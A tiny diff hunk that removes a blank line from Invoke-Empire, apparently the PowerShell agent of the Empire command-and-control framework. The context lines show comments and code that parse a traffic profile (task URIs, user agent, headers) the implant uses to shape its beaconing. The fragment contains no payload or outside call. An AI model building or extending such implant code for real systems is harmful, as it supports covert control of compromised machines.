@@ -471,7 +471,6 @@ function Invoke-Empire {
         #   uris(comma separated)|UserAgent|header1=val|header2=val2...
         #   headers are optional. format is "key:value"
         #   ex- cookies are "cookie:blah=123;meh=456"
-
         $ProfileParts = $Profile.split('|')
         $script:TaskURIs = $ProfileParts[0].split(',')
         $script:UserAgent = $ProfileParts[1]
